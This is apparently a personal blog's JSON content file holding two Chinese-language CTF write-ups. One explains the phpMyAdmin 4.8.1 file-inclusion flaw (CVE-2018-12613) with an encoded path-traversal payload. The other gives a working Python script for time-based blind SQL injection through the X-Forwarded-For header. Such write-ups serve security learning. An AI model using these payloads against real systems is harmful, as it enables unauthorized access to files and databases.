{"meta":{"title":"WWW","subtitle":"W'Note","description":"欢迎光临！","author":"ddd_wmr","url":"http://dddwmr.github.io","root":"/"},"pages":[{"title":"tags","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-24T06:23:11.988Z","comments":true,"path":"tag/index.html","permalink":"http://dddwmr.github.io/tag/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"about","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-27T02:11:39.760Z","comments":true,"path":"about/index.html","permalink":"http://dddwmr.github.io/about/index.html","excerpt":"","text":"秃头先行者 前排吃瓜人 用Blog来记录我的学习进程 抖抖抖王某人前来报到 これから お世話に なります 请多多关照呀 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"分类","date":"2019-08-09T10:53:13.000Z","updated":"2019-08-09T03:42:09.052Z","comments":true,"path":"categories/index.html","permalink":"http://dddwmr.github.io/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"BUUCTF WEB","slug":"BUUCTFwp","date":"2019-10-21T00:00:00.000Z","updated":"2019-10-21T11:15:41.247Z","comments":true,"path":"2019/10/21/BUUCTFwp/","link":"","permalink":"http://dddwmr.github.io/2019/10/21/BUUCTFwp/","excerpt":"","text":"BUUCTF WEBwp HCTF2018WarmUp 菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎查看源码给了source.php,如下 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) ##不能为空 &amp;&amp; is_string($_REQUEST['file']) ##是字符串 &amp;&amp; emmm::checkFile($_REQUEST['file']) ##上面checkfile返回为true ) { include $_REQUEST['file']; exit; } else { echo \"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"; } ?> hint.php flag not here, and flag in ffffllllaaaagggg 解题为了好看先把答案写了，参考下面整理的漏洞，就可以构造出payload?file=hint.php%253f/../../../../ffffllllaaaagggg传入得到flag 解题过程经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞所以先看懂这个漏洞-&gt;做题 phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）漏洞原理一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外： $_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码 $_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码 漏洞成因 在index.php里50-63行 $target_blacklist = array ( 'import.php', 'export.php' ); // If we have a valid target, let's load that script instead if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target']) ) { include $_REQUEST['target']; exit; } 满足五个条件:$_REQUEST[‘target’]不为空,是字符串,不以index开头,不在$target_blacklist中（import.php和export.php） Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件 代码在libraries\\classes\\Core.php 443-476行 Core::checkPageValidity public static function checkPageValidity(&amp;$page, array $whitelist = []) { if (empty($whitelist)) { $whitelist = self::$goto_whitelist; } if (! isset($page) || !is_string($page)) { return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } return false; } 分析代码mb_substr:截取字符串（与substr的区别是它可以截取中文）mb_strpos:匹配（同理，可截取中文）可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作第一次很好理解，这里不再叙述phpmyadmin开发团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次而就在这里出现了漏洞构造payload:target=db_sql.php%253f/../../test.txt浏览器自行解码一次变成:target=db_sql.php%3f/../../test.txt也就是说传入数据里没？所以这时的$page没被截取，$page的值等于$_page继续往下看，先经过函数urldecode一次变成：target=db_sql.php?/../../test.txt这时候截取到问号前即$_page=db_dql.php符合条件通过判断则能包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯) 参考： []: https://www.jianshu.com/p/0d75017c154f …………………………………持续更新…………………………………………. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"http://dddwmr.github.io/categories/ctfweb/"}],"tags":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://dddwmr.github.io/tags/BUUCTF/"},{"name":"代码审计","slug":"代码审计","permalink":"http://dddwmr.github.io/tags/代码审计/"}]},{"title":"insert into","slug":"insert into","date":"2019-08-24T00:00:00.000Z","updated":"2019-08-25T08:34:47.992Z","comments":true,"path":"2019/08/24/insert into/","link":"","permalink":"http://dddwmr.github.io/2019/08/24/insert into/","excerpt":"","text":"insert into 观察题目 可以看到注入点应该在http头的x-forwarded-for上 这里还把‘，’过滤了 因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a 可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a 当然转成ascii码用二分法更有效率但为了更加方便 这里写一个脚本 !/usr/bin/python -*- coding: UTF-8 -*- import requests import string mystring = string.ascii_letters+string.digits#所有字母和数字的集合 url='http://123.206.87.240:8002/web15/' #查库名 data = \"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1\" #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15 #查表名 data = \"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\"#查出来时clineip和flag #查字段名 data = \"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1\" #查出来是 flag #查内容 data= \"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 \" flag = '' for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以 for j in mystring: try: headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去 res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码 except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求 flag += j print(flag) break print('The final flag:'+flag) 由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}（最好每次只开一个运行 不然出错概率太大） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"ctfweb","slug":"ctfweb","permalink":"http://dddwmr.github.io/categories/ctfweb/"}],"tags":[{"name":"bugku","slug":"bugku","permalink":"http://dddwmr.github.io/tags/bugku/"},{"name":"sql注入","slug":"sql注入","permalink":"http://dddwmr.github.io/tags/sql注入/"}]}]}